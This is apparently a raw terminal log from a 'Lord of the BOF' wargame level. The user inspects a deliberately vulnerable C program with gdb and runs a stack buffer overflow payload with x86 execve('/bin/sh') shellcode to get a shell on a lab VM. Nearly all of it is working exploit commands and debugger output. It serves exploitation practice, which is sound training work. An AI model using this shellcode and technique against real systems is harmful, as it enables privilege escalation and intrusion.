bash$ ./cobalt `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"A"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAͺ
Segmentation fault (core dumped)
bash$ exit
exit
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"A"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'` 
AAAAAAAAAAAAAAAAAAAAͺÿ¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1￐h//shh/bin⏓ኂ°
                                                                                                                                          ̀ 
bash$ exit
exit
[gremlin@localhost gremlin]$ 
[gremlin@localhost gremlin]$ 
[gremlin@localhost gremlin]$ 
[gremlin@localhost gremlin]$ 
[gremlin@localhost gremlin]$ 
[gremlin@localhost gremlin]$ 
[gremlin@localhost gremlin]$ 




WHat is fpo!!!














Xshell 5 (Build 1055)
Copyright (c) 2002-2016 NetSarang Computer, Inc. All rights reserved.

Type `help' to learn how to use Xshell prompt.
[c:\~]$ 

Connecting to 192.168.56.129:23...
Connection established.
To escape to local shell, press 'Ctrl+Alt+]'.
                                            _______________________
  _______________________-------------------                       `\
 /:--__                                                              |
||< > |                                   ___________________________/
| \__/_________________-------------------                         |
|                                                                  |
 |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
 |                                                                  |
 |                                                                  |
  |       [enter to the dungeon]                                    |
  |       gate : gate                                                |
  |                                                                  |
  |       [RULE]                                                     |
   |      - do not use local root exploit                             |
   |      - do not use LD_PRELOAD to my-pass                          |
   |      - do not use single boot                    [h4ck3rsch001] |
  |                                              ____________________|_
  |  ___________________-------------------------                      `\
  |/`--_                                                                 |
  ||[ ]||                                            ___________________/
   \===/___________________-------------------------- 


login: f^H
Password: 
Login incorrect

login: gremlin
Password: 
Last login: Wed Feb  7 17:20:00 from 192.168.56.1
[gremlin@localhost gremlin]$ ls
cobolt  cobolt.c  core  tmp
[gremlin@localhost gremlin]$ ls
cobolt  cobolt.c  core  tmp
[gremlin@localhost gremlin]$ ls
cobolt  cobolt.c  core  tmp
[gremlin@localhost gremlin]$ cat cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
[gremlin@localhost gremlin]$ cp cobolt cobalt
[gremlin@localhost gremlin]$ ls
cobalt  cobolt  cobolt.c  core  tmp
[gremlin@localhost gremlin]$ ./cobalt asdf
asdf
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print "A"*16'`
AAAAAAAAAAAAAAAA
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print "A"*20'`
AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print "A"*20'`
AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb -q cobalt
(gdb) r ./cobalt `python -c 'print "A"*20'`
Starting program: /home/gremlin/cobalt ./cobalt `python -c 'print "A"*20'`
./cobalt

Program exited with code 011.
(gdb) disas main
Dump of assembler code for function main:
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x10,%esp
0x8048436 <main+6>:	cmpl   $0x1,0x8(%ebp)
0x804843a <main+10>:	jg     0x8048453 <main+35>
0x804843c <main+12>:	push   $0x80484d0
0x8048441 <main+17>:	call   0x8048350 <printf>
0x8048446 <main+22>:	add    $0x4,%esp
0x8048449 <main+25>:	push   $0x0
0x804844b <main+27>:	call   0x8048360 <exit>
0x8048450 <main+32>:	add    $0x4,%esp
0x8048453 <main+35>:	mov    0xc(%ebp),%eax
0x8048456 <main+38>:	add    $0x4,%eax
0x8048459 <main+41>:	mov    (%eax),%edx
0x804845b <main+43>:	push   %edx
0x804845c <main+44>:	lea    0xfffffff0(%ebp),%eax
0x804845f <main+47>:	push   %eax
0x8048460 <main+48>:	call   0x8048370 <strcpy>
0x8048465 <main+53>:	add    $0x8,%esp
0x8048468 <main+56>:	lea    0xfffffff0(%ebp),%eax
0x804846b <main+59>:	push   %eax
0x804846c <main+60>:	push   $0x80484dc
0x8048471 <main+65>:	call   0x8048350 <printf>
0x8048476 <main+70>:	add    $0x8,%esp
0x8048479 <main+73>:	leave  
0x804847a <main+74>:	ret    
0x804847b <main+75>:	nop    
0x804847c <main+76>:	nop    
0x804847d <main+77>:	nop    
0x804847e <main+78>:	nop    
0x804847f <main+79>:	nop    
End of assembler dump.
(gdb) b *main+53
Breakpoint 1 at 0x8048465
(gdb) r ./cobalt `python -c 'print "A"*20'`
Starting program: /home/gremlin/cobalt ./cobalt `python -c 'print "A"*20'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffb00:	0xbffffb08	0xbffffc6f	0x6f632f2e	0x746c6162
0xbffffb10:	0x08049400	0x08049500	0xbffffb38	0x400309cb
0xbffffb20:	0x00000003	0xbffffb64	0xbffffb74	0x40013868
0xbffffb30:	0x00000003	0x08048380	0x00000000	0x080483a1
0xbffffb40:	0x08048430	0x00000003	0xbffffb64	0x080482e0
0xbffffb50:	0x080484ac	0x4000ae60	0xbffffb5c	0x40013e90
0xbffffb60:	0x00000003	0xbffffc5a	0xbffffc6f	0xbffffc78
0xbffffb70:	0x00000000	0xbffffc8d	0xbffffcaf	0xbffffcb9
0xbffffb80:	0xbffffcc7	0xbffffce6	0xbffffcf6	0xbffffd0e
0xbffffb90:	0xbffffd2b	0xbffffd36	0xbffffd44	0xbffffd87
0xbffffba0:	0xbffffd9a	0xbffffdaf	0xbffffdbf	0xbffffdcc
0xbffffbb0:	0xbffffdeb	0xbffffe04	0xbffffe0f	0xbffffe1c
0xbffffbc0:	0xbffffe24	0x00000000
(gdb) 
0xbffffbc8:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffffbd8:	0x00000005	0x00000006	0x00000006	0x00001000
0xbffffbe8:	0x00000007	0x40000000	0x00000008	0x00000000
0xbffffbf8:	0x00000009	0x08048380	0x0000000b	0x000001f5
0xbffffc08:	0x0000000c	0x000001f5	0x0000000d	0x000001f5
0xbffffc18:	0x0000000e	0x000001f5	0x00000010	0x0fabfbff
0xbffffc28:	0x0000000f	0xbffffc55	0x00000000	0x00000000
0xbffffc38:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x38366900
0xbffffc58:	0x682f0036	0x2f656d6f	0x6d657267	0x2f6e696c
0xbffffc68:	0x61626f63	0x2e00746c	0x626f632f	0x00746c61
0xbffffc78:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc88:	0x41414141	0x53454c00
(gdb) 
0xbffffc90:	0x45504f53	0x2f7c3d4e	0x2f727375	0x2f6e6962
0xbffffca0:	0x7373656c	0x65706970	0x2068732e	0x55007325
0xbffffcb0:	0x4e524553	0x3d454d41	0x53494800	0x5a495354
0xbffffcc0:	0x30313d45	0x48003030	0x4e54534f	0x3d454d41
0xbffffcd0:	0x61636f6c	0x736f686c	0x6f6c2e74	0x646c6163
0xbffffce0:	0x69616d6f	0x4f4c006e	0x4d414e47	0x72673d45
0xbffffcf0:	0x696c6d65	0x4552006e	0x45544f4d	0x54534f48
0xbffffd00:	0x3239313d	0x3836312e	0x2e36352e	0x414d0031
0xbffffd10:	0x2f3d4c49	0x2f726176	0x6f6f7073	0x616d2f6c
0xbffffd20:	0x672f6c69	0x6c6d6572	0x54006e69	0x3d4d5245
0xbffffd30:	0x72657478	0x4f48006d	0x59545453	0x693d4550
0xbffffd40:	0x00363833	0x48544150	0x73752f3d	0x6f6c2f72
0xbffffd50:	0x2f6c6163	0x3a6e6962
(gdb) r ./cobalt `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/gremlin/cobalt ./cobalt `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffb00:	0xbffffb08	0xbffffc6e	0x6f632f2e	0x746c6162
0xbffffb10:	0x08049400	0x08049500	0xbffffb38	0x400309cb
0xbffffb20:	0x00000003	0xbffffb64	0xbffffb74	0x40013868
0xbffffb30:	0x00000003	0x08048380	0x00000000	0x080483a1
0xbffffb40:	0x08048430	0x00000003	0xbffffb64	0x080482e0
0xbffffb50:	0x080484ac	0x4000ae60	0xbffffb5c	0x40013e90
0xbffffb60:	0x00000003	0xbffffc59	0xbffffc6e	0xbffffc77
0xbffffb70:	0x00000000	0xbffffc8d	0xbffffcaf	0xbffffcb9
0xbffffb80:	0xbffffcc7	0xbffffce6	0xbffffcf6	0xbffffd0e
0xbffffb90:	0xbffffd2b	0xbffffd36	0xbffffd44	0xbffffd87
0xbffffba0:	0xbffffd9a	0xbffffdaf	0xbffffdbf	0xbffffdcc
0xbffffbb0:	0xbffffdeb	0xbffffe04	0xbffffe0f	0xbffffe1c
0xbffffbc0:	0xbffffe24	0x00000000
(gdb) 
0xbffffbc8:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffffbd8:	0x00000005	0x00000006	0x00000006	0x00001000
0xbffffbe8:	0x00000007	0x40000000	0x00000008	0x00000000
0xbffffbf8:	0x00000009	0x08048380	0x0000000b	0x000001f5
0xbffffc08:	0x0000000c	0x000001f5	0x0000000d	0x000001f5
0xbffffc18:	0x0000000e	0x000001f5	0x00000010	0x0fabfbff
0xbffffc28:	0x0000000f	0xbffffc54	0x00000000	0x00000000
0xbffffc38:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x36383669
0xbffffc58:	0x6f682f00	0x672f656d	0x6c6d6572	0x632f6e69
0xbffffc68:	0x6c61626f	0x2f2e0074	0x61626f63	0x4100746c
0xbffffc78:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc88:	0x90414141	0x53454c00
(gdb) 
0xbffffc90:	0x45504f53	0x2f7c3d4e	0x2f727375	0x2f6e6962
0xbffffca0:	0x7373656c	0x65706970	0x2068732e	0x55007325
0xbffffcb0:	0x4e524553	0x3d454d41	0x53494800	0x5a495354
0xbffffcc0:	0x30313d45	0x48003030	0x4e54534f	0x3d454d41
0xbffffcd0:	0x61636f6c	0x736f686c	0x6f6c2e74	0x646c6163
0xbffffce0:	0x69616d6f	0x4f4c006e	0x4d414e47	0x72673d45
0xbffffcf0:	0x696c6d65	0x4552006e	0x45544f4d	0x54534f48
0xbffffd00:	0x3239313d	0x3836312e	0x2e36352e	0x414d0031
0xbffffd10:	0x2f3d4c49	0x2f726176	0x6f6f7073	0x616d2f6c
0xbffffd20:	0x672f6c69	0x6c6d6572	0x54006e69	0x3d4d5245
0xbffffd30:	0x72657478	0x4f48006d	0x59545453	0x693d4550
0xbffffd40:	0x00363833	0x48544150	0x73752f3d	0x6f6c2f72
0xbffffd50:	0x2f6c6163	0x3a6e6962
(gdb) r ./cobalt `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/gremlin/cobalt ./cobalt `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffb00:	0xbffffb08	0xbffffc6e	0x6f632f2e	0x746c6162
0xbffffb10:	0x08049400	0x08049500	0xbffffb38	0x400309cb
0xbffffb20:	0x00000003	0xbffffb64	0xbffffb74	0x40013868
0xbffffb30:	0x00000003	0x08048380	0x00000000	0x080483a1
0xbffffb40:	0x08048430	0x00000003	0xbffffb64	0x080482e0
0xbffffb50:	0x080484ac	0x4000ae60	0xbffffb5c	0x40013e90
0xbffffb60:	0x00000003	0xbffffc59	0xbffffc6e	0xbffffc77
0xbffffb70:	0x00000000	0xbffffc8d	0xbffffcaf	0xbffffcb9
0xbffffb80:	0xbffffcc7	0xbffffce6	0xbffffcf6	0xbffffd0e
0xbffffb90:	0xbffffd2b	0xbffffd36	0xbffffd44	0xbffffd87
0xbffffba0:	0xbffffd9a	0xbffffdaf	0xbffffdbf	0xbffffdcc
0xbffffbb0:	0xbffffdeb	0xbffffe04	0xbffffe0f	0xbffffe1c
0xbffffbc0:	0xbffffe24	0x00000000
(gdb) 
0xbffffbc8:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffffbd8:	0x00000005	0x00000006	0x00000006	0x00001000
0xbffffbe8:	0x00000007	0x40000000	0x00000008	0x00000000
0xbffffbf8:	0x00000009	0x08048380	0x0000000b	0x000001f5
0xbffffc08:	0x0000000c	0x000001f5	0x0000000d	0x000001f5
0xbffffc18:	0x0000000e	0x000001f5	0x00000010	0x0fabfbff
0xbffffc28:	0x0000000f	0xbffffc54	0x00000000	0x00000000
0xbffffc38:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x36383669
0xbffffc58:	0x6f682f00	0x672f656d	0x6c6d6572	0x632f6e69
0xbffffc68:	0x6c61626f	0x2f2e0074	0x61626f63	0x4100746c
0xbffffc78:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc88:	0x90414141	0x53454c00
(gdb) q
The program is running.  Exit anyway? (y or n) y
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAA 
Illegal instruction (core dumped)
[gremlin@localhost gremlin]$ bash2
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAÿÿ¿1￐h//shh/bin⏓ኂ°
                                      ̀ 
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb cobalt
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb) r `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
Starting program: /home/gremlin/cobalt `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAA 

Program received signal SIGILL, Illegal instruction.
0x40030090 in ?? () from /lib/libc.so.6
(gdb) x/50 $esp
0xbffffaf0:	0x00000002	0xbffffb34	0xbffffb40	0x40013868
0xbffffb00:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb10:	0x08048430	0x00000002	0xbffffb34	0x080482e0
0xbffffb20:	0x080484ac	0x4000ae60	0xbffffb2c	0x40013e90
0xbffffb30:	0x00000002	0xbffffc2d	0xbffffc42	0x00000000
0xbffffb40:	0xbffffc58	0xbffffc7a	0xbffffc84	0xbffffc92
0xbffffb50:	0xbffffcb1	0xbffffcc1	0xbffffcd9	0xbffffcf6
0xbffffb60:	0xbffffd15	0xbffffd20	0xbffffd2e	0xbffffd71
0xbffffb70:	0xbffffd84	0xbffffd99	0xbffffda9	0xbffffdb6
0xbffffb80:	0xbffffdd5	0xbffffdee	0xbffffdf9	0xbffffe0a
0xbffffb90:	0xbffffe1c	0xbffffe24	0x00000000	0x00000003
0xbffffba0:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffffbb0:	0x00000006	0x00000006
(gdb) 
0xbffffbb8:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffbc8:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffbd8:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffbe8:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffbf8:	0x0fabfbff	0x0000000f	0xbffffc28	0x00000000
0xbffffc08:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc18:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc28:	0x36383669	0x6f682f00	0x672f656d	0x6c6d6572
0xbffffc38:	0x632f6e69	0x6c61626f	0x41410074	0x41414141
0xbffffc48:	0x41414141	0x41414141	0x41414141	0x00904141
0xbffffc58:	0x5353454c	0x4e45504f	0x752f7c3d	0x622f7273
0xbffffc68:	0x6c2f6e69	0x70737365	0x2e657069	0x25206873
0xbffffc78:	0x53550073	0x414e5245
(gdb) 
0xbffffc80:	0x003d454d	0x54534948	0x455a4953	0x3030313d
0xbffffc90:	0x4f480030	0x414e5453	0x6c3d454d	0x6c61636f
0xbffffca0:	0x74736f68	0x636f6c2e	0x6f646c61	0x6e69616d
0xbffffcb0:	0x474f4c00	0x454d414e	0x6572673d	0x6e696c6d
0xbffffcc0:	0x4d455200	0x4845544f	0x3d54534f	0x2e323931
0xbffffcd0:	0x2e383631	0x312e3635	0x49414d00	0x762f3d4c
0xbffffce0:	0x732f7261	0x6c6f6f70	0x69616d2f	0x72672f6c
0xbffffcf0:	0x696c6d65	0x414d006e	0x59544843	0x693d4550
0xbffffd00:	0x2d363833	0x68646572	0x6c2d7461	0x78756e69
0xbffffd10:	0x756e672d	0x52455400	0x74783d4d	0x006d7265
0xbffffd20:	0x54534f48	0x45505954	0x3833693d	0x41500036
0xbffffd30:	0x2f3d4854	0x2f727375	0x61636f6c	0x69622f6c
0xbffffd40:	0x622f3a6e	0x2f3a6e69
(gdb) q
The program is running.  Exit anyway? (y or n) y
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print "A"*20'`                                                                                                                              
AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print "A"*20'`
AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print "A"*20'`
AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb cobalt
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb) disas main
Dump of assembler code for function main:
0x8048430 <main>:	push   %ebp
0x8048431 <main+1>:	mov    %esp,%ebp
0x8048433 <main+3>:	sub    $0x10,%esp
0x8048436 <main+6>:	cmpl   $0x1,0x8(%ebp)
0x804843a <main+10>:	jg     0x8048453 <main+35>
0x804843c <main+12>:	push   $0x80484d0
0x8048441 <main+17>:	call   0x8048350 <printf>
0x8048446 <main+22>:	add    $0x4,%esp
0x8048449 <main+25>:	push   $0x0
0x804844b <main+27>:	call   0x8048360 <exit>
0x8048450 <main+32>:	add    $0x4,%esp
0x8048453 <main+35>:	mov    0xc(%ebp),%eax
0x8048456 <main+38>:	add    $0x4,%eax
0x8048459 <main+41>:	mov    (%eax),%edx
0x804845b <main+43>:	push   %edx
0x804845c <main+44>:	lea    0xfffffff0(%ebp),%eax
0x804845f <main+47>:	push   %eax
0x8048460 <main+48>:	call   0x8048370 <strcpy>
0x8048465 <main+53>:	add    $0x8,%esp
0x8048468 <main+56>:	lea    0xfffffff0(%ebp),%eax
0x804846b <main+59>:	push   %eax
0x804846c <main+60>:	push   $0x80484dc
0x8048471 <main+65>:	call   0x8048350 <printf>
0x8048476 <main+70>:	add    $0x8,%esp
0x8048479 <main+73>:	leave  
0x804847a <main+74>:	ret    
0x804847b <main+75>:	nop    
0x804847c <main+76>:	nop    
0x804847d <main+77>:	nop    
0x804847e <main+78>:	nop    
0x804847f <main+79>:	nop    
End of assembler dump.
(gdb) b *main+53
Breakpoint 1 at 0x8048465
(gdb) r `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
Starting program: /home/gremlin/cobalt `python -c 'print "A"*20+"\x90\xff\xff\xbf"+"\x90"*24+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffad0:	0xbffffad8	0xbffffc42	0x41414141	0x41414141
0xbffffae0:	0x41414141	0x41414141	0x41414141	0x40030090
0xbffffaf0:	0x00000002	0xbffffb34	0xbffffb40	0x40013868
0xbffffb00:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb10:	0x08048430	0x00000002	0xbffffb34	0x080482e0
0xbffffb20:	0x080484ac	0x4000ae60	0xbffffb2c	0x40013e90
0xbffffb30:	0x00000002	0xbffffc2d	0xbffffc42	0x00000000
0xbffffb40:	0xbffffc58	0xbffffc7a	0xbffffc84	0xbffffc92
0xbffffb50:	0xbffffcb1	0xbffffcc1	0xbffffcd9	0xbffffcf6
0xbffffb60:	0xbffffd15	0xbffffd20	0xbffffd2e	0xbffffd71
0xbffffb70:	0xbffffd84	0xbffffd99	0xbffffda9	0xbffffdb6
0xbffffb80:	0xbffffdd5	0xbffffdee	0xbffffdf9	0xbffffe0a
0xbffffb90:	0xbffffe1c	0xbffffe24
(gdb) 
0xbffffb98:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffba8:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffbb8:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffbc8:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffbd8:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffbe8:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffbf8:	0x0fabfbff	0x0000000f	0xbffffc28	0x00000000
0xbffffc08:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc18:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc28:	0x36383669	0x6f682f00	0x672f656d	0x6c6d6572
0xbffffc38:	0x632f6e69	0x6c61626f	0x41410074	0x41414141
0xbffffc48:	0x41414141	0x41414141	0x41414141	0x00904141
0xbffffc58:	0x5353454c	0x4e45504f
(gdb) 
0xbffffc60:	0x752f7c3d	0x622f7273	0x6c2f6e69	0x70737365
0xbffffc70:	0x2e657069	0x25206873	0x53550073	0x414e5245
0xbffffc80:	0x003d454d	0x54534948	0x455a4953	0x3030313d
0xbffffc90:	0x4f480030	0x414e5453	0x6c3d454d	0x6c61636f
0xbffffca0:	0x74736f68	0x636f6c2e	0x6f646c61	0x6e69616d
0xbffffcb0:	0x474f4c00	0x454d414e	0x6572673d	0x6e696c6d
0xbffffcc0:	0x4d455200	0x4845544f	0x3d54534f	0x2e323931
0xbffffcd0:	0x2e383631	0x312e3635	0x49414d00	0x762f3d4c
0xbffffce0:	0x732f7261	0x6c6f6f70	0x69616d2f	0x72672f6c
0xbffffcf0:	0x696c6d65	0x414d006e	0x59544843	0x693d4550
0xbffffd00:	0x2d363833	0x68646572	0x6c2d7461	0x78756e69
0xbffffd10:	0x756e672d	0x52455400	0x74783d4d	0x006d7265
0xbffffd20:	0x54534f48	0x45505954
(gdb) 
0xbffffd28:	0x3833693d	0x41500036	0x2f3d4854	0x2f727375
0xbffffd38:	0x61636f6c	0x69622f6c	0x622f3a6e	0x2f3a6e69
0xbffffd48:	0x2f727375	0x3a6e6962	0x7273752f	0x3131582f
0xbffffd58:	0x622f3652	0x2f3a6e69	0x656d6f68	0x6572672f
0xbffffd68:	0x6e696c6d	0x6e69622f	0x4d4f4800	0x682f3d45
0xbffffd78:	0x2f656d6f	0x6d657267	0x006e696c	0x55504e49
0xbffffd88:	0x3d435254	0x6374652f	0x706e692f	0x63727475
0xbffffd98:	0x45485300	0x2f3d4c4c	0x2f6e6962	0x68736162
0xbffffda8:	0x45535500	0x72673d52	0x696c6d65	0x4142006e
0xbffffdb8:	0x455f4853	0x2f3d564e	0x656d6f68	0x6572672f
0xbffffdc8:	0x6e696c6d	0x61622e2f	0x63726873	0x53494400
0xbffffdd8:	0x59414c50	0x3239313d	0x3836312e	0x2e36352e
0xbffffde8:	0x2e303a31	0x414c0030
(gdb) 
0xbffffdf0:	0x653d474e	0x53555f6e	0x54534f00	0x3d455059
0xbffffe00:	0x756e696c	0x6e672d78	0x57500075	0x682f3d44
0xbffffe10:	0x2f656d6f	0x6d657267	0x006e696c	0x564c4853
0xbffffe20:	0x00323d4c	0x435f534c	0x524f4c4f	0x6f6e3d53
0xbffffe30:	0x3a30303d	0x303d6966	0x69643a30	0x3b31303d
0xbffffe40:	0x6c3a3433	0x31303d6e	0x3a36333b	0x343d6970
0xbffffe50:	0x33333b30	0x3d6f733a	0x333b3130	0x64623a35
0xbffffe60:	0x3b30343d	0x303b3333	0x64633a31	0x3b30343d
0xbffffe70:	0x303b3333	0x726f3a31	0x3b31303d	0x333b3530
0xbffffe80:	0x31343b37	0x3d696d3a	0x303b3130	0x37333b35
0xbffffe90:	0x3a31343b	0x303d7865	0x32333b31	0x632e2a3a
0xbffffea0:	0x303d646d	0x32333b31	0x652e2a3a	0x303d6578
0xbffffeb0:	0x32333b31	0x632e2a3a
(gdb) r `python -c 'print "A"*20'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/gremlin/cobalt `python -c 'print "A"*20'`

Breakpoint 1, 0x8048465 in main ()
(gdb) x/50 $esp
0xbffffad0:	0xbffffad8	0xbffffc43	0x41414141	0x41414141
0xbffffae0:	0x41414141	0x41414141	0x41414141	0x40030900
0xbffffaf0:	0x00000002	0xbffffb34	0xbffffb40	0x40013868
0xbffffb00:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb10:	0x08048430	0x00000002	0xbffffb34	0x080482e0
0xbffffb20:	0x080484ac	0x4000ae60	0xbffffb2c	0x40013e90
0xbffffb30:	0x00000002	0xbffffc2e	0xbffffc43	0x00000000
0xbffffb40:	0xbffffc58	0xbffffc7a	0xbffffc84	0xbffffc92
0xbffffb50:	0xbffffcb1	0xbffffcc1	0xbffffcd9	0xbffffcf6
0xbffffb60:	0xbffffd15	0xbffffd20	0xbffffd2e	0xbffffd71
0xbffffb70:	0xbffffd84	0xbffffd99	0xbffffda9	0xbffffdb6
0xbffffb80:	0xbffffdd5	0xbffffdee	0xbffffdf9	0xbffffe0a
0xbffffb90:	0xbffffe1c	0xbffffe24
(gdb) 
0xbffffb98:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffba8:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffbb8:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffbc8:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffbd8:	0x000001f5	0x0000000c	0x000001f5	0x0000000d
0xbffffbe8:	0x000001f5	0x0000000e	0x000001f5	0x00000010
0xbffffbf8:	0x0fabfbff	0x0000000f	0xbffffc29	0x00000000
0xbffffc08:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc18:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc28:	0x38366900	0x682f0036	0x2f656d6f	0x6d657267
0xbffffc38:	0x2f6e696c	0x61626f63	0x4100746c	0x41414141
0xbffffc48:	0x41414141	0x41414141	0x41414141	0x00414141
0xbffffc58:	0x5353454c	0x4e45504f
(gdb) 
0xbffffc60:	0x752f7c3d	0x622f7273	0x6c2f6e69	0x70737365
0xbffffc70:	0x2e657069	0x25206873	0x53550073	0x414e5245
0xbffffc80:	0x003d454d	0x54534948	0x455a4953	0x3030313d
0xbffffc90:	0x4f480030	0x414e5453	0x6c3d454d	0x6c61636f
0xbffffca0:	0x74736f68	0x636f6c2e	0x6f646c61	0x6e69616d
